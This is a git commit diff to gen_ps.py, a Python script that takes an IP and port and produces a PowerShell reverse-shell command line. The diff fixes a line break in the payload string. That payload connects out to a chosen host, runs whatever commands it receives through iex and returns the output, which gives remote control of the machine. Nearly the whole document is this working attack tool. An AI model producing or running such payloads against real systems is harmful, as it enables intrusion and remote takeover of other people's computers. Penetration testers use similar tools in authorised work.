ec430a526e0af23f7a55d961686ca906e88b46ee
baye <11983328+bayegaspard@users.noreply.github.com>
2023-04-03 21:06:05 -0400

    fixed literal bug in genps

--- gen_ps.py
+++ gen_ps.py
@@ -1,27 +1,19 @@
 import sys
-
 import base64
 
 
 def help():
-
     print("Usage: %s IP PORT" % sys.argv[0])
-
     print("Returns a base64 shell powershell encoded cmdline connecting to IP:PORT")
-
     exit()
 
 try:
-
     (ip,port) = (sys.argv[1],int(sys.argv[2]))
 
 except:
-
     help()
 
-payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data
-= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS" + (pwd).Path + ">";$sendbyte =
-([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS" + (pwd).Path + ">";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 payload = payload % (ip, port)
 
